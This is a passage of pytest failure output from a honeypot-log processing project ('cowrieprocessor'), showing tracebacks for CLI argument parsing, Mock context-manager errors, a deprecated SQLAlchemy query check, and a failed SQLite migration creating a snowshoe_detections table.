        mock_db_class.return_value = mock_db
    
        # Import and run main function with mocked args
        from unittest.mock import patch
    
        from cowrieprocessor.cli.cowrie_db import main
    
        with patch('sys.argv', ['cowrie-db', '--db-path', temp_db, 'integrity']):
>           main()

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_cli.py:314: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/cowrieprocessor/cli/cowrie_db.py:2446: in main
    args = parser.parse_args()
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1898: in parse_args
    args, argv = self.parse_known_args(args, namespace)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1908: in parse_known_args
    return self._parse_known_args2(args, namespace, intermixed=False)
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:1939: in _parse_known_args2
    self.error(str(err))
/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2658: in error
    self.exit(2, _('%(prog)s: error: %(message)s\n') % args)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = ArgumentParser(prog='cowrie-db', usage=None, description='Cowrie database management utilities', formatter_class=<class 'argparse.RawDescriptionHelpFormatter'>, conflict_handler='error', add_help=True)
status = 2
message = "cowrie-db: error: argument command: invalid choice: '/tmp/tmppzwj3r0r.db' (choose from migrate, check, optimize, back...organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)\n"

    def exit(self, status=0, message=None):
        if message:
            self._print_message(message, _sys.stderr)
>       _sys.exit(status)
E       SystemExit: 2

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/argparse.py:2645: SystemExit
----------------------------- Captured stderr call -----------------------------
usage: cowrie-db [-h] [--db-url DB_URL]
                 {migrate,check,optimize,backup,integrity,backfill,sanitize,organize,files,analyze,repair,longtail-migrate,longtail-rollback,longtail-validate,info,migrate-to-postgres} ...
cowrie-db: error: argument command: invalid choice: '/tmp/tmppzwj3r0r.db' (choose from migrate, check, optimize, backup, integrity, backfill, sanitize, organize, files, analyze, repair, longtail-migrate, longtail-rollback, longtail-validate, info, migrate-to-postgres)
____________ TestCowrieDatabaseTypes.test_table_exists_return_type _____________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b4321fd0>

    def test_table_exists_return_type(self):
        """Test that _table_exists returns proper bool type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:66: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805570976'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
_____________ TestCowrieDatabaseTypes.test_table_exists_not_found ______________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b43185a0>

    def test_table_exists_not_found(self):
        """Test _table_exists returns False for non-existent table."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:83: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131213176615136'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
___________ TestCowrieDatabaseTypes.test_validate_schema_return_type ___________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b41c0410>

    def test_validate_schema_return_type(self):
        """Test that validate_schema method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:170: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131213176613120'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
______________ TestCowrieDatabaseTypes.test_optimize_return_type _______________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b40a8210>

    def test_optimize_return_type(self):
        """Test that optimize method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:203: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131213176616144'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
____________ TestCowrieDatabaseTypes.test_create_backup_return_type ____________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b40a84b0>

    def test_create_backup_return_type(self):
        """Test that create_backup method returns proper str type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:221: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131213176617824'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
___________ TestCowrieDatabaseTypes.test_check_integrity_return_type ___________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b3db8ae0>

    def test_check_integrity_return_type(self):
        """Test that check_integrity method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:240: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805571648'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
__________ TestCowrieDatabaseTypes.test_files_table_stats_return_type __________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b43dbf50>

    def test_files_table_stats_return_type(self):
        """Test that get_files_table_stats method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:263: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805573664'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
________ TestCowrieDatabaseTypes.test_backfill_files_table_return_type _________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b42b07d0>

    def test_backfill_files_table_return_type(self):
        """Test that backfill_files_table method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:291: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805575344'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
________ TestCowrieDatabaseTypes.test_analyze_data_quality_return_type _________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b43a5d30>

    def test_analyze_data_quality_return_type(self):
        """Test that analyze_data_quality method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:314: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131213176613456'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
_________ TestCowrieDatabaseTypes.test_repair_data_quality_return_type _________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b43a5f40>

    def test_repair_data_quality_return_type(self):
        """Test that repair_data_quality method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:341: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131213176617152'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
________ TestCowrieDatabaseTypes.test_migrate_to_postgresql_return_type ________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b42cbbb0>

    def test_migrate_to_postgresql_return_type(self):
        """Test that migrate_to_postgresql method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:367: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805575680'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
__________ TestCowrieDatabaseTypes.test_longtail_migrate_return_type ___________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b42cba70>

    def test_longtail_migrate_return_type(self):
        """Test that longtail_migrate method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:413: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805573664'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
__________ TestCowrieDatabaseTypes.test_longtail_rollback_return_type __________

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b42ed880>

    def test_longtail_rollback_return_type(self):
        """Test that longtail_rollback method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:434: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805570976'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
______ TestCowrieDatabaseTypes.test_validate_longtail_schema_return_type _______

self = <test_cowrie_db_types.TestCowrieDatabaseTypes object at 0x7756b3f4e9d0>

    def test_validate_longtail_schema_return_type(self):
        """Test that validate_longtail_schema method returns proper Dict[str, Any] type."""
        with patch.object(CowrieDatabase, '_get_engine') as mock_get_engine:
            mock_engine = Mock()
            mock_connection = Mock()
>           mock_engine.connect.return_value.__enter__.return_value = mock_connection

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:455: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

self = <Mock name='mock.connect()' id='131212805576688'>, name = '__enter__'

    def __getattr__(self, name):
        if name in {'_mock_methods', '_mock_unsafe'}:
            raise AttributeError(name)
        elif self._mock_methods is not None:
            if name not in self._mock_methods or name in _all_magics:
                raise AttributeError("Mock object has no attribute %r" % name)
        elif _is_magic(name):
>           raise AttributeError(name)
E           AttributeError: __enter__

/home/speterson/.local/share/uv/python/cpython-3.13.7-linux-x86_64-gnu/lib/python3.13/unittest/mock.py:692: AttributeError
_______ TestSQLAlchemy20Compatibility.test_no_deprecated_query_patterns ________

self = <test_cowrie_db_types.TestSQLAlchemy20Compatibility object at 0x7756b439f750>

    def test_no_deprecated_query_patterns(self):
        """Test that no deprecated session.query() patterns are used."""
        # This test ensures we're not using deprecated SQLAlchemy 1.x patterns
        import os
    
        # Read the cowrie_db.py file
        cowrie_db_path = os.path.join(os.path.dirname(__file__), '..', '..', 'cowrieprocessor', 'cli', 'cowrie_db.py')
        with open(cowrie_db_path, 'r') as f:
            content = f.read()
    
        # Check for deprecated patterns (exclude test files)
        lines = content.split('\n')
        for i, line in enumerate(lines, 1):
            if 'session.query(' in line and 'test_' not in cowrie_db_path:
>               assert False, f"Found deprecated session.query() pattern on line {i}: {line.strip()}"
E               AssertionError: Found deprecated session.query() pattern on line 260: result['command_count'] = session.query(CommandStat).count()
E               assert False

/home/speterson/cowrieprocessor/tests/unit/test_cowrie_db_types.py:490: AssertionError
__________________ test_delta_loader_ingests_only_new_events ___________________

tmp_path = PosixPath('/tmp/pytest-of-speterson/pytest-33/test_delta_loader_ingests_only0')

    def test_delta_loader_ingests_only_new_events(tmp_path) -> None:
        """Delta loader should append new events without duplicating existing rows."""
        source = tmp_path / "cowrie.log"
        initial_events = [
            {"session": "s1", "eventid": "cowrie.session.connect", "timestamp": "2024-01-01T00:00:00Z"},
            {"session": "s1", "eventid": "cowrie.command.input", "timestamp": "2024-01-01T00:01:00Z", "input": "echo hi"},
        ]
        _write_events(source, initial_events)
    
>       engine = _make_engine(tmp_path)

/home/speterson/cowrieprocessor/tests/unit/test_delta_loader.py:53: 
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 
/home/speterson/cowrieprocessor/tests/unit/test_delta_loader.py:33: in _make_engine
    apply_migrations(engine)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:182: in apply_migrations
    _set_schema_version(connection, 8)
/home/speterson/cowrieprocessor/cowrieprocessor/db/migrations.py:132: in _set_schema_version
    result = connection.execute(stmt)
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1419: in execute
    return meth(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/sql/elements.py:526: in _execute_on_connection
    return connection._execute_clauseelement(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1641: in _execute_clauseelement
    ret = self._execute_context(
/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/base.py:1836: in _execute_context
    TransactionalContext._trans_ctx_check(self)
_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ 

cls = <class 'sqlalchemy.engine.util.TransactionalContext'>
subject = <sqlalchemy.engine.base.Connection object at 0x77566ce39fd0>

    @classmethod
    def _trans_ctx_check(cls, subject: _TConsSubject) -> None:
        trans_context = subject._trans_context_manager
        if trans_context:
            if not trans_context._transaction_is_active():
>               raise exc.InvalidRequestError(
                    "Can't operate on closed transaction inside context "
                    "manager.  Please complete the context manager "
                    "before emitting further commands."
                )
E               sqlalchemy.exc.InvalidRequestError: Can't operate on closed transaction inside context manager.  Please complete the context manager before emitting further commands.

/home/speterson/cowrieprocessor/.venv/lib/python3.13/site-packages/sqlalchemy/engine/util.py:111: InvalidRequestError
----------------------------- Captured stdout call -----------------------------
2025-10-18 18:32:25,717:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
2025-10-18 18:32:25,717:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
Successfully executed: Set default source_generation values
2025-10-18 18:32:25,718:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
2025-10-18 18:32:25,718:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
Successfully executed: Create unique index on raw_events
2025-10-18 18:32:25,727:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:25,727:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
Successfully executed: Populate session_id from JSON (SQLite)
2025-10-18 18:32:25,730:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:25,730:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
Successfully executed: Populate event_type from JSON (SQLite)
2025-10-18 18:32:25,731:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:25,731:INFO:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
Successfully executed: Populate event_timestamp from JSON (SQLite)
2025-10-18 18:32:25,734:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:25,734:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
SQLite boolean defaults for raw_events.quarantined will be set on next schema creation
2025-10-18 18:32:25,738:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:25,738:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.vt_flagged will be set on next schema creation
2025-10-18 18:32:25,740:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:25,740:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
SQLite boolean defaults for session_summaries.dshield_flagged will be set on next schema creation
2025-10-18 18:32:25,741:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:25,741:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
SQLite boolean defaults for command_stats.high_risk will be set on next schema creation
2025-10-18 18:32:25,742:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:25,742:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
SQLite boolean defaults for dead_letter_events.resolved will be set on next schema creation
2025-10-18 18:32:25,745:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:25,745:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v6:SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
SQLite boolean defaults for files.vt_malicious will be set on next schema creation
2025-10-18 18:32:25,746:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:25,746:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v7:Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
Enhanced DLQ features (v7) are PostgreSQL-only, skipping for SQLite
2025-10-18 18:32:25,747:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:25,747:INFO:cowrieprocessor.db.migrations:migrations.py:_upgrade_to_v8:Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
Starting snowshoe detection schema migration (v8)
2025-10-18 18:32:25,748:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
2025-10-18 18:32:25,748:ERROR:cowrieprocessor.db.migrations:migrations.py:_safe_execute_sql:Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
        CREATE TABLE IF NOT EXISTS snowshoe_detections (
            id INTEGER PRIMARY KEY,
            detection_time TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW(),
            window_start TIMESTAMP WITH TIME ZONE NOT NULL,
            window_end TIMESTAMP WITH TIME ZONE NOT NULL,
            confidence_score VARCHAR(10) NOT NULL,
            unique_ips INTEGER NOT NULL,
            single_attempt_ips INTEGER NOT NULL,
            geographic_spread VARCHAR(10) NOT NULL,
            indicators JSON NOT NULL,
            is_likely_snowshoe BOOLEAN NOT NULL DEFAULT FALSE,
            coordinated_timing BOOLEAN NOT NULL DEFAULT FALSE,
            recommendation TEXT,
            analysis_metadata JSON,
            created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT NOW()
        )
        ]
(Background on this error at: https://sqlalche.me/e/20/e3q8)
Failed to execute SQL: Create snowshoe_detections table - (sqlite3.OperationalError) near "(": syntax error
[SQL: 
